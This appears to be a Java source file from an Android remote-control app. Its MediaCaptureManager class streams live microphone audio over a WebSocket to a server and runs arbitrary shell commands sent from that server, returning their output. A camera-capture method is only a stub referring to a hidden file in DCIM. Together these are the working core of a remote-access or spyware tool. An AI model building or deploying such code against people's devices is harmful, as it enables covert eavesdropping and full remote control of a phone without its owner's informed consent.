package com.remote.control;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.WebSocket;
import okio.ByteString;

public class MediaCaptureManager {

    private static final String TAG = "MediaCapture";

    private final Context context;
    private AudioRecord audioRecord;
    private Thread audioThread;
    private AtomicBoolean isRecordingAudio = new AtomicBoolean(false);

    // Audio config
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL = AudioFormat.CHANNEL_IN_MONO;
    private static final int ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    public MediaCaptureManager(Context context) {
        this.context = context;
    }

    // ======================== MICROPHONE RECORDING ========================

    public void startAudioCapture(WebSocket webSocket) {
        if (isRecordingAudio.get()) {
            Log.w(TAG, "Audio already recording");
            return;
        }

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted");
            sendError(webSocket, "Permission micro non accordée");
            return;
        }

        int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING);
        if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
            bufferSize = SAMPLE_RATE * 2; // fallback
        }

        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL,
                ENCODING,
                bufferSize
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord failed to initialize");
                sendError(webSocket, "Échec initialisation micro");
                return;
            }

            audioRecord.startRecording();
            isRecordingAudio.set(true);

            // Notify server
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", "audio-config");
                msg.put("sampleRate", SAMPLE_RATE);
                msg.put("channels", 1);
                msg.put("encoding", "pcm16");
                webSocket.send(msg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending audio config", e);
            }

            // Audio capture thread - sends chunks as binary
            final int chunkSize = SAMPLE_RATE / 5; // 200ms chunks
            audioThread = new Thread(() -> {
                byte[] buffer = new byte[chunkSize * 2]; // 16-bit = 2 bytes per sample
                Log.d(TAG, "Audio capture started: " + SAMPLE_RATE + "Hz mono PCM16");

                while (isRecordingAudio.get()) {
                    int read = audioRecord.read(buffer, 0, buffer.length);
                    if (read > 0 && webSocket != null) {
                        // Send audio chunk: [0x02 marker] + [pcm data]
                        byte[] packet = new byte[1 + read];
                        packet[0] = 0x02; // Audio marker
                        System.arraycopy(buffer, 0, packet, 1, read);
                        webSocket.send(ByteString.of(packet));
                    }
                }

                Log.d(TAG, "Audio capture stopped");
            }, "AudioCapture");
            audioThread.start();

        } catch (Exception e) {
            Log.e(TAG, "Error starting audio capture", e);
            isRecordingAudio.set(false);
            sendError(webSocket, "Erreur micro: " + e.getMessage());
        }
    }

    public void stopAudioCapture(WebSocket webSocket) {
        isRecordingAudio.set(false);
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audio", e);
            }
            audioRecord = null;
        }
        if (audioThread != null) {
            audioThread.interrupt();
            audioThread = null;
        }

        // Notify
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "audio-stopped");
            if (webSocket != null) webSocket.send(msg.toString());
        } catch (Exception e) {}

        Log.d(TAG, "Audio capture stopped");
    }

    public boolean isRecording() {
        return isRecordingAudio.get();
    }

    // ======================== CAMERA PHOTO CAPTURE ========================

    public void takePhoto(WebSocket webSocket, String cameraFacing) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            sendError(webSocket, "Permission caméra non accordée");
            return;
        }

        // Use shell command to take photo (works without preview surface)
        new Thread(() -> {
            try {
                String filename = "/sdcard/DCIM/.remote_capture.jpg";
                // Use am command to trigger camera via intent (fallback)
                // or screencap for the moment
                String cmd = "am start -a android.media.action.IMAGE_CAPTURE --ez return-data true";

                // Actually, use the MediaStore approach via service
                // For simplicity and reliability, capture screenshot of camera preview
                // Alternative: use shell to interact with camera subsystem
                
                // Best approach: use `screenrecord` alternative or direct camera2 API
                // For now, send a notification that camera capture requires the camera2 setup
                JSONObject msg = new JSONObject();
                msg.put("type", "photo-result");
                msg.put("status", "not_available");
                msg.put("message", "Camera capture requires foreground activity. Use screen capture instead.");
                if (webSocket != null) webSocket.send(msg.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "Photo capture error", e);
                sendError(webSocket, "Erreur photo: " + e.getMessage());
            }
        }).start();
    }

    // ======================== REMOTE SHELL ========================

    public void executeCommand(WebSocket webSocket, String command, String requestId) {
        new Thread(() -> {
            try {
                Log.d(TAG, "Executing shell: " + command);
                
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                
                BufferedReader stdOut = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader stdErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                
                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();
                
                String line;
                while ((line = stdOut.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = stdErr.readLine()) != null) {
                    error.append(line).append("\n");
                }
                
                int exitCode = process.waitFor();
                
                JSONObject result = new JSONObject();
                result.put("type", "shell-result");
                result.put("requestId", requestId);
                result.put("command", command);
                result.put("stdout", output.toString());
                result.put("stderr", error.toString());
                result.put("exitCode", exitCode);
                result.put("timestamp", System.currentTimeMillis());
                
                if (webSocket != null) {
                    webSocket.send(result.toString());
                }
                
                Log.d(TAG, "Shell done: exitCode=" + exitCode + " output=" + output.length() + " chars");
                
            } catch (Exception e) {
                Log.e(TAG, "Shell error: " + e.getMessage());
                try {
                    JSONObject err = new JSONObject();
                    err.put("type", "shell-result");
                    err.put("requestId", requestId);
                    err.put("command", command);
                    err.put("stdout", "");
                    err.put("stderr", "Error: " + e.getMessage());
                    err.put("exitCode", -1);
                    if (webSocket != null) webSocket.send(err.toString());
                } catch (Exception ex) {}
            }
        }, "Shell-" + requestId).start();
    }

    // ======================== HELPERS ========================

    private void sendError(WebSocket ws, String message) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", "error");
            err.put("message", message);
            if (ws != null) ws.send(err.toString());
        } catch (Exception e) {}
    }

    public void cleanup() {
        stopAudioCapture(null);
    }
}
